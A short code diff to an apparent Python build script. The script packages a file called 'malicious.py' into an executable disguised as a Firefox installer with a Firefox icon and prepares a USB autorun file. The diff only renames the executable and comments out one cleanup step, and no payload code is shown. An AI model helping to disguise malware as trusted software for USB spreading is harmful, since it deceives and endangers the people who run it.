@@ -5,7 +5,7 @@ import os
 
 # global vars
 filename = "malicious.py"
-exe_name = "firefox_installer_1.44.exe"
+exe_name = "firefox_installer.exe"
 icon = "Firefox.ico"
 pwd = os.getcwd()
 usbdir = os.path.join(pwd, "USB")
@@ -30,7 +30,7 @@ if __name__ == "__main__":
     shutil.move(os.path.join(pwd, "dist", exe_name), pwd)
     shutil.rmtree("dist")
     shutil.rmtree("build")
-    shutil.rmtree("__pycache__")
+    #shutil.rmtree("__pycache__")
     os.remove(exe_name + ".spec")
 
     print("Creating AutoRun File")
